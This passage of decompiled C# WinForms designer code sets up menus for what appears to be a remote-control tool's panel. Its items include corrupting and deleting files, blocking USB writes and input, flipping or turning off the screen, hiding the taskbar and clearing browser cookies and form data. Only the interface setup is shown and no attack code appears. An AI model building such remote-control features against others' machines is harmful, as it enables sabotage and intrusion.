        (ToolStripItem) this.DwarOnScreenToolStripMenuItem,
        (ToolStripItem) this.CleanRecycleBinToolStripMenuItem,
        (ToolStripItem) this.USBWriteToolStripMenuItem,
        (ToolStripItem) this.SetTimeToolStripMenuItem,
        (ToolStripItem) this.InfoToolStripMenuItem,
        (ToolStripItem) this.ToolStripMenuItem1,
        (ToolStripItem) this.InstalledSoftwareToolStripMenuItem,
        (ToolStripItem) this.IEClearToolStripMenuItem
      });
      this.PCToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("PCToolStripMenuItem.Image");
      this.PCToolStripMenuItem.Name = "PCToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem1 = this.PCToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size3 = size1;
      toolStripMenuItem1.Size = size3;
      this.PCToolStripMenuItem.Text = "PC";
      this.StatusToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.ShutdownToolStripMenuItem,
        (ToolStripItem) this.RestartToolStripMenuItem,
        (ToolStripItem) this.StandByToolStripMenuItem,
        (ToolStripItem) this.HibernationToolStripMenuItem
      });
      this.StatusToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("StatusToolStripMenuItem.Image");
      this.StatusToolStripMenuItem.Name = "StatusToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem2 = this.StatusToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size4 = size1;
      toolStripMenuItem2.Size = size4;
      this.StatusToolStripMenuItem.Text = "Status";
      this.ShutdownToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ShutdownToolStripMenuItem.Image");
      this.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem3 = this.ShutdownToolStripMenuItem;
      size1 = new Size(137, 22);
      Size size5 = size1;
      toolStripMenuItem3.Size = size5;
      this.ShutdownToolStripMenuItem.Text = "Shutdown";
      this.RestartToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RestartToolStripMenuItem.Image");
      this.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem4 = this.RestartToolStripMenuItem;
      size1 = new Size(137, 22);
      Size size6 = size1;
      toolStripMenuItem4.Size = size6;
      this.RestartToolStripMenuItem.Text = "Restart";
      this.StandByToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("StandByToolStripMenuItem.Image");
      this.StandByToolStripMenuItem.Name = "StandByToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem5 = this.StandByToolStripMenuItem;
      size1 = new Size(137, 22);
      Size size7 = size1;
      toolStripMenuItem5.Size = size7;
      this.StandByToolStripMenuItem.Text = "Stand By";
      this.HibernationToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("HibernationToolStripMenuItem.Image");
      this.HibernationToolStripMenuItem.Name = "HibernationToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem6 = this.HibernationToolStripMenuItem;
      size1 = new Size(137, 22);
      Size size8 = size1;
      toolStripMenuItem6.Size = size8;
      this.HibernationToolStripMenuItem.Text = "Hibernation";
      this.CDRomToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.OpenToolStripMenuItem,
        (ToolStripItem) this.CloseToolStripMenuItem
      });
      this.CDRomToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("CDRomToolStripMenuItem.Image");
      this.CDRomToolStripMenuItem.Name = "CDRomToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem7 = this.CDRomToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size9 = size1;
      toolStripMenuItem7.Size = size9;
      this.CDRomToolStripMenuItem.Text = "CD Rom";
      this.OpenToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("OpenToolStripMenuItem.Image");
      this.OpenToolStripMenuItem.Name = "OpenToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem8 = this.OpenToolStripMenuItem;
      size1 = new Size(103, 22);
      Size size10 = size1;
      toolStripMenuItem8.Size = size10;
      this.OpenToolStripMenuItem.Text = "Open";
      this.CloseToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("CloseToolStripMenuItem.Image");
      this.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem9 = this.CloseToolStripMenuItem;
      size1 = new Size(103, 22);
      Size size11 = size1;
      toolStripMenuItem9.Size = size11;
      this.CloseToolStripMenuItem.Text = "Close";
      this.Mouse00ToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("Mouse00ToolStripMenuItem.Image");
      this.Mouse00ToolStripMenuItem.Name = "Mouse00ToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem10 = this.Mouse00ToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size12 = size1;
      toolStripMenuItem10.Size = size12;
      this.Mouse00ToolStripMenuItem.Text = "Mouse (0, 0)";
      this.BlockSiteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("BlockSiteToolStripMenuItem.Image");
      this.BlockSiteToolStripMenuItem.Name = "BlockSiteToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem11 = this.BlockSiteToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size13 = size1;
      toolStripMenuItem11.Size = size13;
      this.BlockSiteToolStripMenuItem.Text = "Block Site";
      this.CloseProcessToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("CloseProcessToolStripMenuItem.Image");
      this.CloseProcessToolStripMenuItem.Name = "CloseProcessToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem12 = this.CloseProcessToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size14 = size1;
      toolStripMenuItem12.Size = size14;
      this.CloseProcessToolStripMenuItem.Text = "Close Process";
      this.DeleteFileToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DeleteFileToolStripMenuItem.Image");
      this.DeleteFileToolStripMenuItem.Name = "DeleteFileToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem13 = this.DeleteFileToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size15 = size1;
      toolStripMenuItem13.Size = size15;
      this.DeleteFileToolStripMenuItem.Text = "Delete File";
      this.SetIEHomePageToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SetIEHomePageToolStripMenuItem.Image");
      this.SetIEHomePageToolStripMenuItem.Name = "SetIEHomePageToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem14 = this.SetIEHomePageToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size16 = size1;
      toolStripMenuItem14.Size = size16;
      this.SetIEHomePageToolStripMenuItem.Text = "Set IE Home Page";
      this.SetClipboardToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SetClipboardToolStripMenuItem.Image");
      this.SetClipboardToolStripMenuItem.Name = "SetClipboardToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem15 = this.SetClipboardToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size17 = size1;
      toolStripMenuItem15.Size = size17;
      this.SetClipboardToolStripMenuItem.Text = "Set Clipboard";
      this.DwarOnScreenToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DwarOnScreenToolStripMenuItem.Image");
      this.DwarOnScreenToolStripMenuItem.Name = "DwarOnScreenToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem16 = this.DwarOnScreenToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size18 = size1;
      toolStripMenuItem16.Size = size18;
      this.DwarOnScreenToolStripMenuItem.Text = "Draw On Screen";
      this.CleanRecycleBinToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("CleanRecycleBinToolStripMenuItem.Image");
      this.CleanRecycleBinToolStripMenuItem.Name = "CleanRecycleBinToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem17 = this.CleanRecycleBinToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size19 = size1;
      toolStripMenuItem17.Size = size19;
      this.CleanRecycleBinToolStripMenuItem.Text = "Clean RecycleBin";
      this.USBWriteToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.BlockToolStripMenuItem1,
        (ToolStripItem) this.UnblockToolStripMenuItem1
      });
      this.USBWriteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("USBWriteToolStripMenuItem.Image");
      this.USBWriteToolStripMenuItem.Name = "USBWriteToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem18 = this.USBWriteToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size20 = size1;
      toolStripMenuItem18.Size = size20;
      this.USBWriteToolStripMenuItem.Text = "USB Write";
      this.BlockToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("BlockToolStripMenuItem1.Image");
      this.BlockToolStripMenuItem1.Name = "BlockToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_1 = this.BlockToolStripMenuItem1;
      size1 = new Size(118, 22);
      Size size21 = size1;
      toolStripMenuItem1_1.Size = size21;
      this.BlockToolStripMenuItem1.Text = "Block";
      this.UnblockToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("UnblockToolStripMenuItem1.Image");
      this.UnblockToolStripMenuItem1.Name = "UnblockToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_2 = this.UnblockToolStripMenuItem1;
      size1 = new Size(118, 22);
      Size size22 = size1;
      toolStripMenuItem1_2.Size = size22;
      this.UnblockToolStripMenuItem1.Text = "Unblock";
      this.SetTimeToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SetTimeToolStripMenuItem.Image");
      this.SetTimeToolStripMenuItem.Name = "SetTimeToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem19 = this.SetTimeToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size23 = size1;
      toolStripMenuItem19.Size = size23;
      this.SetTimeToolStripMenuItem.Text = "Set Time";
      this.InfoToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("InfoToolStripMenuItem.Image");
      this.InfoToolStripMenuItem.ImageAlign = ContentAlignment.MiddleLeft;
      this.InfoToolStripMenuItem.Name = "InfoToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem20 = this.InfoToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size24 = size1;
      toolStripMenuItem20.Size = size24;
      this.InfoToolStripMenuItem.Text = "Info";
      this.ToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("ToolStripMenuItem1.Image");
      this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_3 = this.ToolStripMenuItem1;
      size1 = new Size(167, 22);
      Size size25 = size1;
      toolStripMenuItem1_3.Size = size25;
      this.ToolStripMenuItem1.Text = "Corrupt File";
      this.InstalledSoftwareToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("InstalledSoftwareToolStripMenuItem.Image");
      this.InstalledSoftwareToolStripMenuItem.Name = "InstalledSoftwareToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem21 = this.InstalledSoftwareToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size26 = size1;
      toolStripMenuItem21.Size = size26;
      this.InstalledSoftwareToolStripMenuItem.Text = "Installed Software";
      this.IEClearToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.CookiesToolStripMenuItem,
        (ToolStripItem) this.HistoryToolStripMenuItem,
        (ToolStripItem) this.FormDataToolStripMenuItem,
        (ToolStripItem) this.TempFilesToolStripMenuItem
      });
      this.IEClearToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("IEClearToolStripMenuItem.Image");
      this.IEClearToolStripMenuItem.Name = "IEClearToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem22 = this.IEClearToolStripMenuItem;
      size1 = new Size(167, 22);
      Size size27 = size1;
      toolStripMenuItem22.Size = size27;
      this.IEClearToolStripMenuItem.Text = "IE Clear";
      this.CookiesToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("CookiesToolStripMenuItem.Image");
      this.CookiesToolStripMenuItem.Name = "CookiesToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem23 = this.CookiesToolStripMenuItem;
      size1 = new Size(131, 22);
      Size size28 = size1;
      toolStripMenuItem23.Size = size28;
      this.CookiesToolStripMenuItem.Text = "Cookies";
      this.HistoryToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("HistoryToolStripMenuItem.Image");
      this.HistoryToolStripMenuItem.Name = "HistoryToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem24 = this.HistoryToolStripMenuItem;
      size1 = new Size(131, 22);
      Size size29 = size1;
      toolStripMenuItem24.Size = size29;
      this.HistoryToolStripMenuItem.Text = "History";
      this.FormDataToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("FormDataToolStripMenuItem.Image");
      this.FormDataToolStripMenuItem.Name = "FormDataToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem25 = this.FormDataToolStripMenuItem;
      size1 = new Size(131, 22);
      Size size30 = size1;
      toolStripMenuItem25.Size = size30;
      this.FormDataToolStripMenuItem.Text = "Form Data";
      this.TempFilesToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("TempFilesToolStripMenuItem.Image");
      this.TempFilesToolStripMenuItem.Name = "TempFilesToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem26 = this.TempFilesToolStripMenuItem;
      size1 = new Size(131, 22);
      Size size31 = size1;
      toolStripMenuItem26.Size = size31;
      this.TempFilesToolStripMenuItem.Text = "Temp Files";
      this.APIToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[14]
      {
        (ToolStripItem) this.MonitorToolStripMenuItem,
        (ToolStripItem) this.KeyboardMouseToolStripMenuItem,
        (ToolStripItem) this.DesktopToolStripMenuItem,
        (ToolStripItem) this.ClockToolStripMenuItem,
        (ToolStripItem) this.NotifyToolStripMenuItem,
        (ToolStripItem) this.SoundToolStripMenuItem,
        (ToolStripItem) this.ProcessSusResToolStripMenuItem,
        (ToolStripItem) this.TaskbarToolStripMenuItem,
        (ToolStripItem) this.IconsToolStripMenuItem,
        (ToolStripItem) this.ChangeProcessTitleToolStripMenuItem,
        (ToolStripItem) this.ClipboardToolStripMenuItem,
        (ToolStripItem) this.HidenFilesToolStripMenuItem,
        (ToolStripItem) this.ToolStripMenuItem2,
        (ToolStripItem) this.ToolStripMenuItem5
      });
      this.APIToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("APIToolStripMenuItem.Image");
      this.APIToolStripMenuItem.Name = "APIToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem27 = this.APIToolStripMenuItem;
      size1 = new Size(159, 22);
      Size size32 = size1;
      toolStripMenuItem27.Size = size32;
      this.APIToolStripMenuItem.Text = "API";
      this.MonitorToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.TurnOnToolStripMenuItem,
        (ToolStripItem) this.TurnOffToolStripMenuItem,
        (ToolStripItem) this.FlipScreenToolStripMenuItem,
        (ToolStripItem) this.ScreenSaverToolStripMenuItem
      });
      this.MonitorToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("MonitorToolStripMenuItem.Image");
      this.MonitorToolStripMenuItem.Name = "MonitorToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem28 = this.MonitorToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size33 = size1;
      toolStripMenuItem28.Size = size33;
      this.MonitorToolStripMenuItem.Text = "Monitor";
      this.TurnOnToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("TurnOnToolStripMenuItem.Image");
      this.TurnOnToolStripMenuItem.Name = "TurnOnToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem29 = this.TurnOnToolStripMenuItem;
      size1 = new Size(137, 22);
      Size size34 = size1;
      toolStripMenuItem29.Size = size34;
      this.TurnOnToolStripMenuItem.Text = "Turn On";
      this.TurnOffToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("TurnOffToolStripMenuItem.Image");
      this.TurnOffToolStripMenuItem.Name = "TurnOffToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem30 = this.TurnOffToolStripMenuItem;
      size1 = new Size(137, 22);
      Size size35 = size1;
      toolStripMenuItem30.Size = size35;
      this.TurnOffToolStripMenuItem.Text = "Turn Off";
      this.FlipScreenToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.TurnOnToolStripMenuItem1,
        (ToolStripItem) this.TurnOffToolStripMenuItem2
      });
      this.FlipScreenToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("FlipScreenToolStripMenuItem.Image");
      this.FlipScreenToolStripMenuItem.Name = "FlipScreenToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem31 = this.FlipScreenToolStripMenuItem;
      size1 = new Size(137, 22);
      Size size36 = size1;
      toolStripMenuItem31.Size = size36;
      this.FlipScreenToolStripMenuItem.Text = "Flip Screen";
      this.TurnOnToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("TurnOnToolStripMenuItem1.Image");
      this.TurnOnToolStripMenuItem1.Name = "TurnOnToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_4 = this.TurnOnToolStripMenuItem1;
      size1 = new Size(119, 22);
      Size size37 = size1;
      toolStripMenuItem1_4.Size = size37;
      this.TurnOnToolStripMenuItem1.Text = "Turn On";
      this.TurnOffToolStripMenuItem2.Image = (Image) componentResourceManager.GetObject("TurnOffToolStripMenuItem2.Image");
      this.TurnOffToolStripMenuItem2.Name = "TurnOffToolStripMenuItem2";
      ToolStripMenuItem toolStripMenuItem2_1 = this.TurnOffToolStripMenuItem2;
      size1 = new Size(119, 22);
      Size size38 = size1;
      toolStripMenuItem2_1.Size = size38;
      this.TurnOffToolStripMenuItem2.Text = "Turn Off";
      this.ScreenSaverToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.TurnOnToolStripMenuItem2,
        (ToolStripItem) this.TurnOffToolStripMenuItem3
      });
      this.ScreenSaverToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ScreenSaverToolStripMenuItem.Image");
      this.ScreenSaverToolStripMenuItem.Name = "ScreenSaverToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem32 = this.ScreenSaverToolStripMenuItem;
      size1 = new Size(137, 22);
      Size size39 = size1;
      toolStripMenuItem32.Size = size39;
      this.ScreenSaverToolStripMenuItem.Text = "ScreenSaver";
      this.TurnOnToolStripMenuItem2.Image = (Image) componentResourceManager.GetObject("TurnOnToolStripMenuItem2.Image");
      this.TurnOnToolStripMenuItem2.Name = "TurnOnToolStripMenuItem2";
      ToolStripMenuItem toolStripMenuItem2_2 = this.TurnOnToolStripMenuItem2;
      size1 = new Size(119, 22);
      Size size40 = size1;
      toolStripMenuItem2_2.Size = size40;
      this.TurnOnToolStripMenuItem2.Text = "Turn On";
      this.TurnOffToolStripMenuItem3.Image = (Image) componentResourceManager.GetObject("TurnOffToolStripMenuItem3.Image");
      this.TurnOffToolStripMenuItem3.Name = "TurnOffToolStripMenuItem3";
      ToolStripMenuItem toolStripMenuItem3_1 = this.TurnOffToolStripMenuItem3;
      size1 = new Size(119, 22);
      Size size41 = size1;
      toolStripMenuItem3_1.Size = size41;
      this.TurnOffToolStripMenuItem3.Text = "Turn Off";
      this.KeyboardMouseToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.SwapMouseToolStripMenuItem,
        (ToolStripItem) this.BlockToolStripMenuItem,
        (ToolStripItem) this.UnblockToolStripMenuItem,
        (ToolStripItem) this.ClickerToolStripMenuItem
      });
      this.KeyboardMouseToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("KeyboardMouseToolStripMenuItem.Image");
      this.KeyboardMouseToolStripMenuItem.Name = "KeyboardMouseToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem33 = this.KeyboardMouseToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size42 = size1;
      toolStripMenuItem33.Size = size42;
      this.KeyboardMouseToolStripMenuItem.Text = "Keyboard - Mouse";
      this.SwapMouseToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.LeftToolStripMenuItem,
        (ToolStripItem) this.RightToolStripMenuItem
      });
      this.SwapMouseToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SwapMouseToolStripMenuItem.Image");
      this.SwapMouseToolStripMenuItem.Name = "SwapMouseToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem34 = this.SwapMouseToolStripMenuItem;
      size1 = new Size(141, 22);
      Size size43 = size1;
      toolStripMenuItem34.Size = size43;
      this.SwapMouseToolStripMenuItem.Text = "Swap Mouse";
      this.LeftToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("LeftToolStripMenuItem.Image");
      this.LeftToolStripMenuItem.Name = "LeftToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem35 = this.LeftToolStripMenuItem;
      size1 = new Size(102, 22);
      Size size44 = size1;
      toolStripMenuItem35.Size = size44;
      this.LeftToolStripMenuItem.Text = "Left";
      this.RightToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RightToolStripMenuItem.Image");
      this.RightToolStripMenuItem.Name = "RightToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem36 = this.RightToolStripMenuItem;
      size1 = new Size(102, 22);
      Size size45 = size1;
      toolStripMenuItem36.Size = size45;
      this.RightToolStripMenuItem.Text = "Right";
      this.BlockToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("BlockToolStripMenuItem.Image");
      this.BlockToolStripMenuItem.Name = "BlockToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem37 = this.BlockToolStripMenuItem;
      size1 = new Size(141, 22);
      Size size46 = size1;
      toolStripMenuItem37.Size = size46;
      this.BlockToolStripMenuItem.Text = "Enable";
      this.UnblockToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("UnblockToolStripMenuItem.Image");
      this.UnblockToolStripMenuItem.Name = "UnblockToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem38 = this.UnblockToolStripMenuItem;
      size1 = new Size(141, 22);
      Size size47 = size1;
      toolStripMenuItem38.Size = size47;
      this.UnblockToolStripMenuItem.Text = "Disable";
      this.ClickerToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ClickerToolStripMenuItem.Image");
      this.ClickerToolStripMenuItem.Name = "ClickerToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem39 = this.ClickerToolStripMenuItem;
      size1 = new Size(141, 22);
      Size size48 = size1;
      toolStripMenuItem39.Size = size48;
      this.ClickerToolStripMenuItem.Text = "Clicker";
      this.DesktopToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.LockToolStripMenuItem,
        (ToolStripItem) this.UnlockToolStripMenuItem,
        (ToolStripItem) this.FocusToolStripMenuItem
      });
      this.DesktopToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DesktopToolStripMenuItem.Image");
      this.DesktopToolStripMenuItem.Name = "DesktopToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem40 = this.DesktopToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size49 = size1;
      toolStripMenuItem40.Size = size49;
      this.DesktopToolStripMenuItem.Text = "Desktop";
      this.LockToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("LockToolStripMenuItem.Image");
      this.LockToolStripMenuItem.Name = "LockToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem41 = this.LockToolStripMenuItem;
      size1 = new Size(111, 22);
      Size size50 = size1;
      toolStripMenuItem41.Size = size50;
      this.LockToolStripMenuItem.Text = "Lock";
      this.UnlockToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("UnlockToolStripMenuItem.Image");
      this.UnlockToolStripMenuItem.Name = "UnlockToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem42 = this.UnlockToolStripMenuItem;
      size1 = new Size(111, 22);
      Size size51 = size1;
      toolStripMenuItem42.Size = size51;
      this.UnlockToolStripMenuItem.Text = "Unlock";
      this.FocusToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("FocusToolStripMenuItem.Image");
      this.FocusToolStripMenuItem.Name = "FocusToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem43 = this.FocusToolStripMenuItem;
      size1 = new Size(111, 22);
      Size size52 = size1;
      toolStripMenuItem43.Size = size52;
      this.FocusToolStripMenuItem.Text = "Focus";
      this.ClockToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.ShowToolStripMenuItem,
        (ToolStripItem) this.HideToolStripMenuItem
      });
      this.ClockToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ClockToolStripMenuItem.Image");
      this.ClockToolStripMenuItem.Name = "ClockToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem44 = this.ClockToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size53 = size1;
      toolStripMenuItem44.Size = size53;
      this.ClockToolStripMenuItem.Text = "Clock";
      this.ShowToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ShowToolStripMenuItem.Image");
      this.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem45 = this.ShowToolStripMenuItem;
      size1 = new Size(103, 22);
      Size size54 = size1;
      toolStripMenuItem45.Size = size54;
      this.ShowToolStripMenuItem.Text = "Show";
      this.HideToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("HideToolStripMenuItem.Image");
      this.HideToolStripMenuItem.Name = "HideToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem46 = this.HideToolStripMenuItem;
      size1 = new Size(103, 22);
      Size size55 = size1;
      toolStripMenuItem46.Size = size55;
      this.HideToolStripMenuItem.Text = "Hide";
      this.NotifyToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.ShowToolStripMenuItem1,
        (ToolStripItem) this.HideToolStripMenuItem1
      });
      this.NotifyToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("NotifyToolStripMenuItem.Image");
      this.NotifyToolStripMenuItem.Name = "NotifyToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem47 = this.NotifyToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size56 = size1;
      toolStripMenuItem47.Size = size56;
      this.NotifyToolStripMenuItem.Text = "Notify";
      this.ShowToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("ShowToolStripMenuItem1.Image");
      this.ShowToolStripMenuItem1.Name = "ShowToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_5 = this.ShowToolStripMenuItem1;
      size1 = new Size(103, 22);
      Size size57 = size1;
      toolStripMenuItem1_5.Size = size57;
      this.ShowToolStripMenuItem1.Text = "Show";
      this.HideToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("HideToolStripMenuItem1.Image");
      this.HideToolStripMenuItem1.Name = "HideToolStripMenuItem1";
      ToolStripMenuItem toolStripMenuItem1_6 = this.HideToolStripMenuItem1;
      size1 = new Size(103, 22);
      Size size58 = size1;
      toolStripMenuItem1_6.Size = size58;
      this.HideToolStripMenuItem1.Text = "Hide";
      this.SoundToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.MuteToolStripMenuItem
      });
      this.SoundToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SoundToolStripMenuItem.Image");
      this.SoundToolStripMenuItem.Name = "SoundToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem48 = this.SoundToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size59 = size1;
      toolStripMenuItem48.Size = size59;
      this.SoundToolStripMenuItem.Text = "Sound";
      this.MuteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("MuteToolStripMenuItem.Image");
      this.MuteToolStripMenuItem.Name = "MuteToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem49 = this.MuteToolStripMenuItem;
      size1 = new Size(102, 22);
      Size size60 = size1;
      toolStripMenuItem49.Size = size60;
      this.MuteToolStripMenuItem.Text = "Mute";
      this.ProcessSusResToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ProcessSusResToolStripMenuItem.Image");
      this.ProcessSusResToolStripMenuItem.Name = "ProcessSusResToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem50 = this.ProcessSusResToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size61 = size1;
      toolStripMenuItem50.Size = size61;
      this.ProcessSusResToolStripMenuItem.Text = "Process Sus / Res";
      this.TaskbarToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.ShowToolStripMenuItem2,
        (ToolStripItem) this.HideToolStripMenuItem2
      });
      this.TaskbarToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("TaskbarToolStripMenuItem.Image");
      this.TaskbarToolStripMenuItem.Name = "TaskbarToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem51 = this.TaskbarToolStripMenuItem;
      size1 = new Size(206, 22);
      Size size62 = size1;
      toolStripMenuItem51.Size = size62;
      this.TaskbarToolStripMenuItem.Text = "Taskbar";
      this.ShowToolStripMenuItem2.Image = (Image) componentResourceManager.GetObject("ShowToolStripMenuItem2.Image");
      this.ShowToolStripMenuItem2.Name = "ShowToolStripMenuItem2";
      ToolStripMenuItem toolStripMenuItem2_3 = this.ShowToolStripMenuItem2;
      size1 = new Size(103, 22);
      Size size63 = size1;
      toolStripMenuItem2_3.Size = size63;
      this.ShowToolStripMenuItem2.Text = "Show";
